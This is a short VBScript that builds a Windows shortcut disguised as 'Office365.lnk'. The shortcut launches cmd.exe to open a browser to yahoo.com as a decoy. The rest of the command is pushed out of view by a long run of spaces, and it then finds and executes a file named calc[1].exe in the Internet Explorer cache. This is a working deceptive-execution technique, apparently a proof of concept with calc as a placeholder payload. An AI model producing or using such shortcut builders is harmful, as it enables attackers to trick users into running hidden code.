Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = ".\Office365.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\cmd.exe"
oLink.Arguments = "/c ""start ""C:\Program Files\Google\Chrome\Application\chrome.exe"" https://www.yahoo.com ""                                                                                                                                                                                                 ""&& for /f ""delims="" %a in ('dir /b /a-d /s ""%localappdata%\Microsoft\Windows\INetCache\IE\calc[1].exe""') do ""%~fa"""
oLink.WorkingDirectory = "."
oLink.Description = ""
'oLink.IconLocation = ""
oLink.Save


                                                                                                                                                                                                 